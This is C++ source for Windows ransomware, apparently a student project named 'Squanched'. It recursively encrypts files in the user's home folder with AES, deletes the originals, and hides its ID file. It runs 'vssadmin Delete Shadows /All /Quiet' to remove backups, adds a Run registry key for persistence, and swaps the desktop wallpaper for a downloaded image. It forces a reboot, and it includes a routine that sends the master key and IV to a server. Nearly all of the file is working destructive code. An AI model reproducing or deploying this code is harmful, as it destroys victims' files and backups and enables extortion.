#include "Encryption.h"
#include <algorithm>
#include <stdexcept>
#define LIMIT_CPU_FAIL 0

#define VM 0

using namespace boost::filesystem;
using std::string;

void encrypt(string path, const PBYTE masterIV, const PBYTE masterKey);

string get_username();
void test();
void notify();
static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
void changeHiddenFileState(bool state);
void destroyVSS();

Status changeWallPaper(const string&);
Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
void doRestart();
void makeFileHidden(string path);
void RegisterProgram();

int encryption_main( bool fromStart) {
//	crypt_data* d = generatekey();//TODO also move to encrypt
	PBYTE masterIV = nullptr, masterKey = nullptr;
	string path = ROOT_DIR;
	string pathToImage = get_path_to_jpeg();
	RsaEncryptor Enc;
#if VM
	RegisterProgram();
#endif
	changeHiddenFileState(false);

	string pathToID = get_path_to_id();

	//TODO set SquanchedID and IMAGE invisible
	std::fstream IDFile;
	PBYTE id = nullptr;
	HANDLE hCurrentProcess = nullptr;
	HANDLE hJob = nullptr;
	vector<string> processed;
	string fileRead;
	/* let's begin*/
	Status status = generateKeyAndIV(&masterIV, &masterKey);
	if (!NT_SUCCESS(status))
	{
		goto CLEAN;
	}
	 id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
	if (NULL == id) {
		goto CLEAN;
	}
	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status))
	{
		goto CLEAN;
	}
	/*status = sendIVAndKeyToServer(masterIV,masterKey,id);
	if(!NT_SUCCESS(status))
	{
		goto CLEAN;
	}*/

	status = LimitCPU(hCurrentProcess, hJob);
	if(LIMIT_CPU_FAIL == status)
	{
		goto CLEAN;
	}
#if VM
	destroyVSS();
#endif
	

//	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
//	std::ofstream masterKeyIVFile;
//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
//	masterKeyIVFile.write((char*)masterKey, KEY_LEN);
//	masterKeyIVFile.write((char*)masterIV, IV_LEN);
//	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
//	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
//	masterKeyIVFile.close();
	
	
	IDFile.open(pathToID, std::ios::out);
	if(!IDFile.is_open())
	{
		std::cout << "Failed to open file: " << GetLastError() << std::endl;
	}
	IDFile << NOT_FINISHED_ENCRYPTION;
	IDFile.write((char*)id, ID_LEN);
	IDFile.close();
	makeFileHidden(pathToID);

	

	
#ifndef DEBUG
	string path = get_home();
#endif

//	encrypt(path, masterIV, masterKey);
	iterate2(path, &encrypt, masterIV, masterKey, processed);
	for(auto& path : processed)
	{
		remove(path);
	}
	IDFile.open(pathToID, std::ios::in | std::ios::out);
	if (!IDFile.is_open())
	{
		std::cout << "Failed to open file: " << GetLastError() << std::endl;
	}
	fileRead = string((std::istreambuf_iterator<char>(IDFile)), std::istreambuf_iterator<char>());
	IDFile.seekp(0);
	fileRead[0] = FINISHED_ENCRYPTION;
	IDFile << fileRead;
	IDFile.close();

	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
	makeFileHidden(pathToImage);
	changeHiddenFileState(true);
//#ifdef DEBUG
//	std::cout << "Username: " << get_username() << std::endl;
//	encrypt(d, "./README.md");
//#endif
//
//	send();
//
//	delete d;
//
//	notify();
//
#if VM
	changeWallPaper(pathToImage);//TODO move to notify
#endif

CLEAN:
	if (masterKey)
		HeapFree(GetProcessHeap(), 0, masterKey);
	if (masterIV)
		HeapFree(GetProcessHeap(), 0, masterIV);
	if (id)
		HeapFree(GetProcessHeap(), 0, id);
#if VM
	doRestart();
#endif
	return 0;
}




/*usefull functions =]] */

Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id)
{
	DWORD status;
	string strID;
	strID.assign((char*)id, ID_LEN);
	strID = string_to_hex(strID);
	string strMasterIV;
	strMasterIV.assign((char*)masterIV, IV_LEN);
	strMasterIV = string_to_hex(strMasterIV);
	string strMasterKey;
	strMasterKey.assign((char*)masterKey, KEY_LEN);
	strMasterKey = string_to_hex(strMasterKey);
	string str = "ID=";
	str += strID + "&&";
	str += "IV=" + strMasterIV + "&&";
	str += "key=" + strMasterKey;
	status = SendToServer(str);

	
	return status;
}

void makeFileHidden(string path)
{
	DWORD attributes = GetFileAttributes(path.c_str());
	SetFileAttributes(path.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
}

void destroyVSS()
{
	ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
}

void changeHiddenFileState(bool state)
{
	SHELLSTATE ss;
	ZeroMemory(&ss, sizeof(ss));
	ss.fShowAllObjects = state;
	ss.fShowSysFiles = state;
	ss.fShowSuperHidden = state;
	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
}

DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
{
	DWORD status;
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;
	status = getKeyHandle(masterKey, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (NULL == tmpIv) {
		HeapFree(GetProcessHeap(), 0, tmpIv);
		return STATUS_UNSUCCESSFUL;
	}
	memcpy(tmpIv, masterIV, IV_LEN);
	DWORD  resSize;

	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
{
	DWORD status = STATUS_INVALID_HANDLE;
	*iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (!(*iv)) {
		return STATUS_UNSUCCESSFUL;
	}
	*key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
	if(!(*key)) {
		return STATUS_UNSUCCESSFUL;
	}
	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
{
	std::ifstream plaintextFile;
	plaintextFile.open(path, std::ios::binary);
	if (!plaintextFile.is_open()) {
		return false;
	}
	*buffer = new BYTE[buffSize + 1];
	if(nullptr == *buffer) {
		plaintextFile.close();
		return false;
	}
		
	char c;
	for (size_t i = 0; i < buffSize; ++i) {
		plaintextFile.get(c);
		(*buffer)[i] = c;
	}
	(*buffer)[buffSize] = '\0';
	plaintextFile.close();
	return true;
}

void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
{
	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; 
	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
	ofile.write((char*)cipherText, cipherLen);
	int size_tot = IV_DIGITS_NUM + KEY_LEN + IV_LEN + cipherLen;
	makeFileHidden(path + LOCKED_EXTENSION);
	ofile.close();
	
}

DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
{
	DWORD status;

	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	ULONG res;
	char blockLen[50] ={0};
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
	if (!NT_SUCCESS(status)) {
		std::cout << "BAD KEY HANDLE" << std::endl;
		return status;

	}

	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
{
	DWORD status;
	PBYTE plainText = nullptr;
	size_t plainTextLen = getFileSize(path);
	
	
	PBYTE iv = nullptr;
	PBYTE key = nullptr;

	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;

	PBYTE keyIVBuff = nullptr;
	PBYTE keyIV = nullptr;
	PBYTE cipherText = nullptr;
	if(!initPlainText(path, &plainText, plainTextLen)) {
		goto CLEANUP;
	}

	status = generateKeyAndIV(&iv, &key);
	if(!NT_SUCCESS(status)) {
		goto CLEANUP;
		std::cout << "key and IV set FAIL";//TODO remove if doesn't show
	}
	//keep in persistant file


	
	status = getKeyHandle(key, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
	DWORD cipherSize,resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(NULL == tmpIv) {
		goto CLEANUP;
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if(NULL == cipherText) {
		goto CLEANUP;
	}
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif

	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN );
	if(keyIVBuff == nullptr)
	{
		goto CLEANUP;
	}
	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	if (keyIV == nullptr)
	{
		goto CLEANUP;
	}
	memcpy(keyIV,key,KEY_LEN);
	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
	
	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
	if(!NT_SUCCESS(status))
	{
		goto CLEANUP;
	}
	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
	
CLEANUP:
	if(plainText)
		delete plainText;
	if (iv)
		HeapFree(GetProcessHeap(), 0, iv);
	if (key)
		HeapFree(GetProcessHeap(), 0, key);
	if (aesHandle)
		BCryptCloseAlgorithmProvider(aesHandle, 0);
	if (keyHandle)
		BCryptDestroyKey(keyHandle);
	if (cipherText)
		HeapFree(GetProcessHeap(), 0, cipherText);
	if(keyIV)
		HeapFree(GetProcessHeap(), 0, keyIV);
	if (keyIVBuff)
		HeapFree(GetProcessHeap(), 0, keyIVBuff);
}

Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
{
	Status status;
	/* following will slow down the whole process*/
	hCurrentProcess = GetCurrentProcess();
	if (nullptr == hCurrentProcess)
	{
		return LIMIT_CPU_FAIL;
	}
	hJob = CreateJobObject(NULL, NULL);
	if (nullptr == hJob)
	{
		return LIMIT_CPU_FAIL;
	}
	status = AssignProcessToJobObject(hJob, hCurrentProcess);
	if (0 == status)
	{
		return LIMIT_CPU_FAIL;
	}
	JOBOBJECT_CPU_RATE_CONTROL_INFORMATION cpuInfo;
	status = QueryInformationJobObject(
		hJob,
		JobObjectCpuRateControlInformation,
		&cpuInfo,
		sizeof(cpuInfo),
		NULL);
	if (0 == status) {
		return LIMIT_CPU_FAIL;
	}
	cpuInfo.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP |
		JOB_OBJECT_CPU_RATE_CONTROL_ENABLE |
		JOB_OBJECT_CPU_RATE_CONTROL_NOTIFY;
	cpuInfo.CpuRate = (5 * 100);
	//5 is arbitrary, *100 is a way to normalize value based on documentation
	status = SetInformationJobObject(
		hJob,
		JobObjectCpuRateControlInformation,
		&cpuInfo,
		sizeof(cpuInfo)
	);
	return status;
}

Status changeWallPaper(const string& path)
{
	PVOID str = (PVOID)path.c_str();
	int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE);
	if(!return_value)
	{
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}

void doRestart()
{
	HANDLE hToken = NULL;
	LUID luid;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	LookupPrivilegeValue("", SE_SHUTDOWN_NAME, &luid);
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, 0);

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
}


//string get_username() {
//#ifdef _WIN32
//	char username[UNLEN + 1];
//	DWORD length = UNLEN + 1;
//	GetUserName(username, &length);
//
//	return string(username);
//#else
//	struct passwd *pw;
//
//	uid_t uid = geteuid();
//	pw = getpwuid(uid);
//	if (pw) {
//		return string(pw->pw_name);
//	}
//
//	return EMPTY;
//#endif
//}
//

//}
//
//void notify() {
//	if (OPEN_FILE) {
//		std::ofstream ofile(NOTIFY_FILENAME);
//		ofile.write(NOTIFY_MESSAGE, sizeof(NOTIFY_MESSAGE));
//		ofile.close();
//
//		system((string("start ") + NOTIFY_FILENAME).c_str());
//	}
//}
//
//void send() {
//
//}
